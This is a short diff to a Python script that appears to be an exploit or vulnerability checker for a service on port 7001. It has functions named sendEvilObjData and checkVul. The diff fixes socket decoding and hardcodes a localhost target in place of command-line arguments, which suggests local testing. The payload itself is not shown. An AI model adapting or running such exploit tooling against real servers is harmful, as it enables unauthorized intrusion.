@@ -45,7 +45,7 @@ def sendEvilObjData(sock,data):
     res = ''
     try:
         while True:
-            res += sock.recv(4096)
+            res += sock.recv(4096).decode("utf8", "ignore")
             time.sleep(0.1)
     except Exception:
         pass
@@ -69,6 +69,8 @@ def run(rip,rport,index):
     checkVul(rs,index)
 
 if __name__=="__main__":
-    dip = sys.argv[1]
-    dport = int(sys.argv[2])
+    # dip = sys.argv[1]
+    # dport = int(sys.argv[2])
+    dip = '127.0.0.1'
+    dport = 7001
     run(dip,dport,0)
